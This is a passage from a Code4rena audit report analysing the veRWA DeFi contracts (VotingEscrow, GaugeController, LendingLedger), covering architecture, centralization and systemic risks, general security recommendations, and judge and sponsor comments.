        - A thorough security audit by professionals can help identify vulnerabilities and potential attack vectors that might not be obvious. Security should always be a top priority.

    6. **Event Logging**:
        - Adding well-defined event logs can help external services and users better understand the state changes and actions taken within the contract.

    7. **More Comprehensive Testing**:
        - Extensive testing, including unit tests, integration tests, and possibly even external audits, can help ensure the robustness and correctness of the protocol.


## 4- Architectural 
![Architectural](https://user-images.githubusercontent.com/98446738/274802517-86178eef-94fc-46d2-95ab-3157597eb444.png)

- **Users**:
Users interact with the `veRWA project` through their actions, such as depositing tokens, voting on governance proposals, and participating in lending markets.

- **`VotingEscrow.sol`**:
    - This contract manages the voting and token locking system. Users can lock their tokens for a specified period and take part in community decision-making. The contract might be designed to encourage active participation and reward users for their voting actions.

- **`GaugeController.sol`**:
    - The `GaugeController` contract could manage the "gauges" that influence reward distribution. This contract likely defines how rewards are allocated among different markets or assets based on their relative weights.

- **`LendingLedger.sol`**:
    - This contract is the core of the lending and rewards functionality. Users can deposit tokens into lending markets, earn cTokens, and receive rewards in the form of `CANTO` tokens. The contract keeps track of user balances, total balances in each lending market, and other relevant metrics. It also allows users to claim rewards and enables governance to configure rewards.

This overview provides a general understanding of how the different components interact within the `veRWA project`.

## 5- Documents 
- It would be helpful if the Documentation explained how the ecosystem works from a basic contract level so that it is easier to digest for developers, users and auditors looking to integrate into the ``veRWA project``, it is recommended to add the architectural design to the documents as infographic

- I would also recommend adding quality Medium articles, it's a great way to provide an in-depth look at many of the topics in the project and is used by many blockchain projects.

##  6- Systemic & Centralization Risks
Here's an analysis of potential systemic and centralization risks in the provided contracts:

### Systemic Risks:

- **Epoch-Based System**: 
    - The protocol relies heavily on the concept of epochs (measured in weeks) for various functions like rewards, claims, and balances. If there's a flaw in how epochs are calculated or if the timing gets disrupted due to network issues, it could affect the accuracy of rewards and claims.

- **Reward Calculations**: 
    - The calculation of rewards involves several variables, including market weights, balances, and reward amounts. If any of these variables are inaccurately calculated, it could lead to incorrect distribution of rewards, potentially causing dissatisfaction among users.

- **Lending Market Whitelist**: 
    - The whitelist for lending markets is controlled by governance. If there's centralized control over whitelisting and governance decisions, it could result in concentration of power and decision-making, which goes against the principles of decentralization.

### Centralization Risks:

- **Governance Control**: 
    - The governance address is hard-coded in the contract. If the governance becomes inactive or malicious, it could lead to a centralized decision-making process or even potential abuse of power.

- **Market Whitelisting**: 
    - The ability for governance to whitelist or blacklist lending markets could lead to centralization if decisions are made without involving the broader community. Centralized control over market participation can hinder innovation and competition.

- **Reward Settings**: 
    - Governance's control over reward settings introduces centralization in determining how rewards are distributed. Mismanagement of rewards or a lack of transparency in setting rewards could lead to dissatisfaction among users.

- **Dependent Contracts**: 
    - The protocol relies on external contracts like `VotingEscrow` and `GaugeController`. If these contracts are compromised or misconfigured, it could impact the overall functionality of the `veRWA project`.

- **Rewards Allocation**: 
    - The distribution of rewards based on market weights controlled by `GaugeController` could be centralized if the controller's decisions are not well-distributed or transparently managed.

It's important to address these risks through careful auditing, community involvement, decentralization measures, and ongoing monitoring. The protocol should strive to minimize centralization, ensure transparency, and have contingency plans for potential disruptions or flaws in the system.

## 7- Security Approach of the Project
What the project should add in the understanding of Security?

- **Input Validation**: 
    - Ensuring that inputs to functions are properly validated and sanitized to prevent unexpected behavior or vulnerabilities like integer overflows/underflows, division by zero, etc.

- **Access Control**: 
    - Implementing proper access controls to restrict sensitive functions and data to authorized entities only. It seems that there is already an onlyGovernance modifier in the `LendingLedger.sol` contract for certain functions, which suggests some level of access control.

- **External Contract Interaction**: 
    - Ensuring secure interactions with external contracts to prevent unexpected behavior or vulnerabilities. This involves validating return values, using established interfaces, and handling failures gracefully.


- **Audits and Testing**: 
    - Conducting comprehensive security audits by reputable third-party auditors and performing extensive testing, including unit testing, integration testing, and scenario-based testing.

- **Code Simplicity and Clarity**: 
    - Keeping the codebase simple and easy to understand, which can reduce the risk of introducing vulnerabilities due to complex logic.

- **Known Vulnerability Mitigation-**: 
    - Staying updated with the latest developments in the blockchain and smart contract security space to mitigate known vulnerabilities.

- **Emergency Measures**: 
    - Implementing mechanisms for pausing or upgrading contracts in case of vulnerabilities or emergencies.

- **Continuous Monitoring and Response**: 
    - Implementing monitoring and response mechanisms to detect anomalies or attacks and respond to them in a timely manner.

## 8- Other Audit Reports and Automated Findings 

**Automated Findings:**
https://github.com/code-423n4/2023-08-verwa/blob/main/bot-report.md


## 9- New insights and learning from this audit 
The insights and learnings that could be gained from analyzing the provided smart contracts from the `veRWA project`. 

**Complexity and Design Patterns**: 
    - Analyzing these contracts might offer insights into how complex DeFi protocols are designed and implemented. Understanding the interplay of different contracts, data structures, and design patterns could deepen your understanding of decentralized applications.

**Governance and Voting**: 
    - By studying the `VotingEscrow` contract, you could learn about how decentralized governance and voting mechanisms are implemented. This could be valuable for understanding how community-driven decisions are made in various projects.

**Tokenization and Rewards**: 
- The use of ERC-20 tokens (like CANTO) for rewards and incentives demonstrates the tokenization of value within DeFi ecosystems. Learning about how tokens are distributed as rewards can provide insights into incentivizing users' participation.

## Conclusion 
In general, the `veRWA project` exhibits an interesting and well-developed architecture we believe the team has done a good job regarding the code, but the identified risks need to be addressed, and measures should be implemented to protect the protocol from potential malicious use cases. Additionally, it is recommended to improve the documentation and comments in the code to enhance understanding and collaboration among developers. It is also highly recommended that the team continues to invest in security measures such as mitigation reviews, audits, and bug bounty programs to maintain the security and reliability of the project. 

### Time Spent ⏱
A total of 2 days were spent to cover this audit, broken down into the following:
1. 1st Day: Trying to understand the protocol flows and implementation
2. 2nd Day: We focused on conducting the most comprehensive analysis possible, adding handcrafted diagrams based on the contracts and information provided by the protocol.

**Time spent:**
24 hours

**[OpenCoreCH (veRWA) acknowledged and commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/446#issuecomment-1680815830):**
 > Great report! I especially like the diagram.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/446#issuecomment-1698568381):**
 > The diagrams in this report are representative of the effort put into it. Additionally, sections 5 (Documents), 6 (Risks) and 7 (Security Approach) complete the report further by providing additional insight. 
> 
> While the application description in [#452](https://github.com/code-423n4/2023-08-verwa-findings/issues/452) is more thorough and detailed, and should be reviewed by those exploring the codebase, this report offers more value for the sponsor, and is therefore selected for the report.

***


# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
